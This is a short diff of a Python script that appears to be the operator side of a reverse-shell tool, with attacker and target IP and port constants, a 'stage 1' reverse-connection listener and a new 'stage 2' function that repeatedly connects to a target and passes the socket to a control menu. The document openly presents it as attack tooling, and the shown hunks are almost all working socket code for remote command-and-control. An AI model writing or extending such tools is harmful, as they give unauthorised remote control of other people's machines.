@@ -1,14 +1,34 @@
 import socket
 from time import sleep
 
+ATTACKER_IP = "0.0.0.0"
+ATTACKER_PORT = 22
 
-TARGET_IP = "192.168.68.107"
-TARGET_PORT = 8080
+TARGET_IP = "192.168.68.106"
+TARGET_PORT = 8989
 
-ATTACKER_IP = "192.168.68.102"
-ATTACKER_PORT = 4444
+def connection():
+    # | 1. dst addr | 2. skt | 3. connect | 4. sendall
+    print("[>>>] stage 2")
 
-def awaitConfirmation():
+    RUN = True
+
+    while RUN:
+        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        status = skt.connect_ex((TARGET_IP, TARGET_PORT))
+        if status == 0:
+            print("[*] Connection established")
+            RUN = False
+        else:
+            sleep(5)
+            print(f"[!] Could not connect to server {status}")
+            skt.close()
+
+    response = skt.recv(1024).decode("utf-8")
+    print(f" > {response}")
+    mainMenu(skt)
+
+def reverseConnection():
     # | 1.src addr | 2. skt init | 3.bind | 4.listen | 5.new skt | 6.recv | 7.sendall |
 
     print("[*] Init stage 1")
@@ -94,6 +114,6 @@ def reverseShell(skt):
 
 
 
-awaitConfirmation()
-
+reverseConnection()
+connection()
 
